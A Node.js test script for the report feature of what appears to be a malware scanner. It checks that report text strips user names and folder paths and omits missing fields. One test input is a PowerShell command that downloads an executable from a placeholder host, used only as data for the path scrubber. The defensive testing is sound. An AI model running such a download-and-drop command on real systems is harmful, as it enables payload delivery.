#!/usr/bin/env node
// Tests for ui/report.js: the details "Report as safe" copies must not carry the account name
// or the folder a file was found in. Run: node scripts/test_report.js  (exit 1 on failure)
"use strict";
const assert = require("assert");
const path = require("path");
const R = require(path.join(__dirname, "..", "ui", "report.js"));

assert.strictEqual(R.scrub("C:\\Users\\John Smith\\Downloads\\a.exe"), "C:\\Users\\…\\Downloads\\a.exe");
assert.strictEqual(R.scrub("/Users/alex/Library/x and /home/sam/y"), "/Users/…/Library/x and /home/…/y");
assert.strictEqual(R.scrub("powershell -c iwr http://x/p -o c:/users/BOB/p.exe"), "powershell -c iwr http://x/p -o c:/users/…/p.exe");
assert.strictEqual(R.scrub("score=0.97 threshold=0.65; packed code"), "score=0.97 threshold=0.65; packed code");
assert.strictEqual(R.scrub(null), "");
assert.strictEqual(R.fileName("C:\\Users\\bob\\evil.exe"), "evil.exe");
assert.strictEqual(R.fileName("powershell.exe (pid 8842)"), "powershell.exe (pid 8842)");

const text = R.reportText({
  threat_type: "MALWARE_AI", severity: "HIGH", target: "/Users/alex/Downloads/My Game/game.exe",
  details: "score=0.91 threshold=0.65; launched from /Users/alex/Downloads/My Game", sha256: "ab".repeat(32), size: 1234,
  action_taken: "QUARANTINED id=abc", timestamp: "2026-11-25T10:00:00Z",
}, { version: "0.4.1", platform: "macos" });
assert.ok(!/alex/.test(text), text);
assert.ok(!/My Game\/game\.exe/.test(text), text); // the folder is not next to the file name
for (const part of ["The Nex 0.4.1 on macos", "Type: MALWARE_AI", "File: game.exe", "SHA-256: abab", "Size: 1234 bytes", "score=0.91", "QUARANTINED id=abc"]) {
  assert.ok(text.includes(part), `${part} missing from:\n${text}`);
}
// A quarantine record has no severity or action: those lines are left out, not printed as "undefined".
assert.ok(!/undefined|null/.test(R.reportText({ threat_type: "ZIP_BOMB", target: "a.zip", details: "ratio 1028:1" }, {})));
console.log("report text tests passed");
